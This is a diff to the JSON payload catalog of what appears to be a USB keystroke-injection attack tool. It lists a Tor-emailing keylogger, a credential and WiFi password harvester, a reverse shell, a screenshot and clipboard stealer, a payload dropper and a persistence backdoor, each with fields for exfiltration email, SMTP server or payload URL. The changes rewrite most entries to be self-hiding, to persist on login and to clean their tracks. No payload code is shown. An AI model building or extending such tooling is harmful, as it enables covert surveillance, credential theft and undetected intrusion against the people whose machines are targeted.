@@ -3,12 +3,14 @@
     "id": "keylogger_tor",
     "name": "Keylogger + Tor Email",
     "icon": "📧",
-    "description": "Stealthy keylogger that logs keystrokes and emails them encrypted through Tor every night.",
+    "description": "Self-hiding keylogger that emails encrypted keystroke logs daily through Tor/SMTP.",
     "category": "SURVEILLANCE",
     "risk": "CRITICAL",
     "fields": [
       {"key": "email", "label": "Your email address", "hint": "you@email.com", "help": "Where the encrypted logs will be sent", "required": true},
-      {"key": "time", "label": "Send time (24hr)", "hint": "04:00", "help": "Logs sent at this time daily through Tor", "required": true, "default": "04:00"},
+      {"key": "time", "label": "Send time (HH:MM)", "hint": "04:00", "help": "Logs sent at this time daily through Tor", "required": true, "default": "04:00"},
+      {"key": "time_hour", "label": "Send hour (0-23)", "hint": "4", "help": "Hour component of send time", "required": true, "default": "4"},
+      {"key": "time_min", "label": "Send minute (0-59)", "hint": "0", "help": "Minute component of send time", "required": true, "default": "0"},
       {"key": "computer_name", "label": "Computer identifier", "hint": "TARGET-01", "help": "Label to identify which machine", "required": true, "default": "TARGET-01"},
       {"key": "smtp_server", "label": "SMTP server", "hint": "smtp.gmail.com", "help": "smtp.gmail.com for Gmail, smtp2go.com for Tor relay", "required": true, "default": "smtp.gmail.com"},
       {"key": "smtp_port", "label": "SMTP port", "hint": "587", "help": "587 for TLS, 465 for SSL", "required": true, "default": "587"},
@@ -20,7 +22,7 @@
     "id": "wifi_dump",
     "name": "WiFi Password Dump",
     "icon": "📶",
-    "description": "Exports ALL saved WiFi passwords from the target and opens them in Notepad.",
+    "description": "Self-hiding. Exports ALL saved WiFi passwords on every login.",
     "category": "CREDENTIALS",
     "risk": "HIGH",
     "fields": [
@@ -31,7 +33,7 @@
     "id": "reverse_shell",
     "name": "Reverse Shell",
     "icon": "🐚",
-    "description": "Opens a reverse shell from target to your machine. Requires netcat listener running.",
+    "description": "Self-hiding. Persistent reverse shell that auto-reconnects every 10 seconds.",
     "category": "EXPLOITATION",
     "risk": "CRITICAL",
     "fields": [
@@ -44,7 +46,7 @@
     "id": "screenshot_exfil",
     "name": "Screenshot Stealer",
     "icon": "📸",
-    "description": "Takes a screenshot and saves it to a shared location.",
+    "description": "Self-hiding. Takes screenshots every 5 minutes, persists on login.",
     "category": "SURVEILLANCE",
     "risk": "HIGH",
     "fields": [
@@ -56,7 +58,7 @@
     "id": "clipboard_monitor",
     "name": "Clipboard Logger",
     "icon": "📋",
-    "description": "Monitors clipboard for changes and logs everything copied.",
+    "description": "Self-hiding. Logs ALL clipboard changes with timestamps, persists on login.",
     "category": "SURVEILLANCE",
     "risk": "HIGH",
     "fields": [
@@ -67,7 +69,7 @@
     "id": "usb_killer",
     "name": "USB Kill Switch",
     "icon": "⚡",
-    "description": "Immediately shuts down the target machine.",
+    "description": "Shuts down the target machine after cleaning all tracks.",
     "category": "DESTRUCTION",
     "risk": "CRITICAL",
     "fields": [
@@ -78,7 +80,7 @@
     "id": "cred_harvester",
     "name": "Credential Harvester",
     "icon": "🔐",
-    "description": "Dumps browser passwords, WiFi keys, and Windows credentials.",
+    "description": "Self-hiding. Dumps WiFi keys, saved RDP creds, browser databases. Persists on login.",
     "category": "CREDENTIALS",
     "risk": "CRITICAL",
     "fields": [
@@ -89,7 +91,7 @@
     "id": "persistence",
     "name": "Persistence Backdoor",
     "icon": "🔄",
-    "description": "Installs persistent backdoor that runs on startup and connects back to your server.",
+    "description": "Self-hiding. 3-method persistence: registry + scheduled task + WMI event subscription.",
     "category": "PERSISTENCE",
     "risk": "CRITICAL",
     "fields": [
@@ -100,13 +102,13 @@
   },
   {
     "id": "office_macro",
-    "name": "Office Macro Injector",
+    "name": "Payload Dropper",
     "icon": "📄",
-    "description": "Injects a macro into a Word doc that downloads and runs a payload.",
+    "description": "Self-hiding. Downloads and executes payload from URL, persists on login.",
     "category": "EXPLOITATION",
     "risk": "CRITICAL",
     "fields": [
-      {"key": "download_url", "label": "Payload URL", "hint": "https://yourserver.com/payload.ps1", "help": "URL of PowerShell script to download and execute", "required": true},
+      {"key": "download_url", "label": "Payload URL", "hint": "https://yourserver.com/payload.ps1", "help": "URL of script/executable to download and run", "required": true},
       {"key": "computer_name", "label": "Computer identifier", "hint": "TARGET-01", "help": "Label for this target", "required": true, "default": "TARGET-01"}
     ]
   },
@@ -114,7 +116,7 @@
     "id": "browser_history",
     "name": "Browser History Dumper",
     "icon": "🌐",
-    "description": "Exports Chrome, Firefox, and Edge browsing history.",
+    "description": "Self-hiding. Copies Chrome/Edge/Firefox history databases, persists on login.",
     "category": "RECONNAISSANCE",
     "risk": "MEDIUM",
     "fields": [
@@ -125,7 +127,7 @@
     "id": "sys_recon",
     "name": "System Recon",
     "icon": "🔍",
-    "description": "Gathers OS, users, software, network, and security info.",
+    "description": "Self-hiding. Gathers OS, users, hardware, software, network, WiFi, AV info.",
     "category": "RECONNAISSANCE",
     "risk": "LOW",
     "fields": [
@@ -136,7 +138,7 @@
     "id": "lock_screen",
     "name": "Lock Screen Prank",
     "icon": "🔒",
-    "description": "Changes wallpaper to a custom message and locks screen. Harmless prank.",
+    "description": "Changes wallpaper to custom message and locks screen. Cleans all tracks.",
     "category": "PRANK",
     "risk": "LOW",
     "fields": [
@@ -148,7 +150,7 @@
     "id": "custom_ducky",
     "name": "Custom DuckyScript",
     "icon": "⌨️",
-    "description": "Write your own DuckyScript from scratch.",
+    "description": "Write your own DuckyScript. Auto-wrapped with pre/post track cleanup.",
     "category": "CUSTOM",
     "risk": "VARIES",
     "fields": [
